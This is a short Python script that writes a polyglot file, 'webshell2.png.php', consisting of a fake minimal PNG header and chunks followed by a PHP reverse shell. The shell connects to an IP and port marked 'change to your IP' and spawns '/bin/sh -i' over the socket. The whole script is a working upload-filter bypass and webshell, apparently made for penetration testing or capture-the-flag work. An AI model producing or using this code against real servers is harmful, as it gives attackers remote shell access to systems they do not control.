# Fake PNG header and chunks
png_header = b'\x89PNG\r\n\x1a\n'
ihdr_chunk = b'\x00\x00\x00\rIHDR' + b'\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde'
iend_chunk = b'\x00\x00\x00\x00IEND\xaeB`\x82'

# PHP reverse shell code
php_code = """<?php
$ip = '10.4.81.175'; // Change to your IP
$port = 1234; // Change to your listening port
$sock = fsockopen($ip, $port);
exec('/bin/sh -i <&3 >&3 2>&3');
?>"""

# Combine fake PNG and PHP shell
with open('webshell2.png.php', 'wb') as f:
    f.write(png_header)  # Write PNG header
    f.write(ihdr_chunk)  # Write minimal IHDR chunk
    f.write(iend_chunk)  # Write IEND chunk
    f.write(b'\n')       # Separate with a newline
    f.write(php_code.encode())  # Write PHP shell code

